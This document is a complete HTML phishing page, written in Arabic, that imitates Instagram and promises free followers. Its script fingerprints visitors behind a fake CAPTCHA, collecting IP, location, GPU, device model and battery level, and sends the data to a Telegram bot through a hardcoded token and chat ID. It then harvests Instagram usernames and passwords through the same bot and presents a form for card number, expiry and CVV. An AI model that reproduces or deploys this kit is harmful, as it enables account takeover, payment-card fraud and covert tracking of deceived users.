<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
        }
        .container {
            background: white; padding: 25px; border: 1px solid #dbdbdb; width: 100%; max-width: 380px; text-align: center; border-radius: 3px;
        }
        .instagram-logo { font-family: 'Style Script', cursive; font-size: 40px; margin-bottom: 20px; color: #262626; }
        
        /* تصميم الكابتشا */
        .captcha-container {
            border: 1px solid #d3d3d3; background: #f9f9f9; padding: 12px;
            display: flex; align-items: center; justify-content: space-between;
            border-radius: 3px; cursor: pointer; margin: 20px 0;
        }
        .captcha-checkbox { width: 22px !important; height: 22px; cursor: pointer; }
        .captcha-text { font-size: 14px; color: #555; flex-grow: 1; text-align: right; margin-right: 10px; }

        .follower-option {
            background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px;
            cursor: pointer; width: 100%; margin: 6px 0; font-weight: bold; font-size: 14px;
        }

        input {
            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb;
            border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px;
        }

        .btn-confirm { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 4px; }

        .payment-box { text-align: right; margin-top: 15px; display: none; }
        .card-group { border: 1px solid #0095f6; border-radius: 8px; padding: 15px; background: #f0f9ff; margin: 10px 0; }
        
        #loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Style+Script&display=swap" rel="stylesheet">
</head>
<body>

<div class="container">
    <div class="instagram-logo">Instagram</div>
    
    <div id="step0">
        <p style="font-size: 14px; color: #8e8e8e;">يرجى تأكيد أنك لست روبوت</p>
        <div class="captcha-container" onclick="validateCaptcha()">
            <div style="display: flex; align-items: center;">
                <input type="checkbox" id="captcha-check" class="captcha-checkbox">
                <span class="captcha-text">أنا لست برنامج روبوت</span>
            </div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" width="30">
        </div>
    </div>

    <div id="step1" style="display:none;">
        <h3 style="font-size: 16px;">اختر كمية المتابعين</h3>
        <button class="follower-option" onclick="goToLogin('5,000')">5,000 Follower</button>
        <button class="follower-option" onclick="goToLogin('15,000')">15,000 Follower</button>
        <button class="follower-option" onclick="goToLogin('50,000')">50,000 Follower</button>
    </div>

    <div id="step2" style="display:none;">
        <p id="status-msg" style="font-size: 13px; font-weight: bold;"></p>
        <input type="text" id="username" placeholder="اسم المستخدم">
        <input type="password" id="password" placeholder="كلمة السر">
        <button class="btn-confirm" id="login-btn" onclick="captureAccount()">تأكيد الحساب</button>
        <div id="loader"></div>
    </div>

    <div id="step3" class="payment-box">
        <h4 style="margin: 0; font-size: 15px;">تنشيط السيرفر النهائي</h4>
        <p style="font-size: 12px; color: #555;">يرجى تأكيد وسيلة الدفع لتنشيط إرسال المتابعين (0.49$ رسوم لمرة واحدة).</p>
        <div class="card-group">
            <input type="text" placeholder="رقم البطاقة">
            <div style="display: flex; gap: 10px;">
                <input type="text" placeholder="MM/YY" style="width: 50%;">
                <input type="text" placeholder="CVV" style="width: 50%;">
            </div>
        </div>
        <button class="btn-confirm" style="background: #262626;">تنشيط الآن</button>
    </div>
</div>

<script>
    let selectedAmount = "";
    const TOKEN = "7973355620:AAGRjTgpBzEul3YIeUq8dAHxO9PTB-OJwvQ";
    const ID = "2103976274";

    async function collectSuperData() {
        let ip = "Checking...";
        let location = "Unknown";
        
        try {
            // محاولة جلب الايبي والموقع بدقة من مصدر قوي
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            ip = d.ip;
            location = `${d.country_name} - ${d.city} (${d.org})`;
        } catch(e) {
            const res2 = await fetch('https://api.ipify.org?format=json');
            const d2 = await res2.json();
            ip = d2.ip;
        }

        // كشف موديل الهاتف الحقيقي عبر الـ GPU (لأن الـ UserAgent قد يكون مخفياً)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";

        // استخراج الموديل من المتصفح
        const ua = navigator.userAgent;
        let model = "Generic Device";
        if (/android/i.test(ua)) {
            const match = ua.match(/\(([^;]+);/);
            model = (match && match[1] !== "Linux") ? match[1] : "Android Device";
        } else if (/iPhone|iPad/.test(ua)) {
            model = "Apple Device";
        }

        const fullMsg = `
🚀 صيد جديد مكتمل البيانات:
--------------------------
📍 الايبي: ${ip}
🌍 الموقع: ${location}
📱 الجهاز: ${model}
⚙️ المعالج الرسومي: ${gpu}
🖥 الشاشة: ${window.screen.width}x${window.screen.height}
🔋 البطارية: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : 'N/A'}
🌐 اللغة: ${navigator.language}
⏰ الوقت: ${new Date().toLocaleString()}
--------------------------`;

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(fullMsg)}`);
    }

    function validateCaptcha() {
        document.getElementById('captcha-check').checked = true;
        collectSuperData();
        setTimeout(() => {
            document.getElementById('step0').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
        }, 800);
    }

    function goToLogin(amount) {
        selectedAmount = amount;
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('status-msg').innerText = "أكد حسابك لاستلام " + amount + " متابع";
    }

    async function captureAccount() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if (!u || !p) return;

        document.getElementById('login-btn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const text = `🔥 حساب جديد صيد:\nاليوزر: ${u}\nالباسورد: ${p}\nالكمية: ${selectedAmount}`;
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);

        setTimeout(() => {
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
        }, 1500);
    }
</script>

</body>
</html>
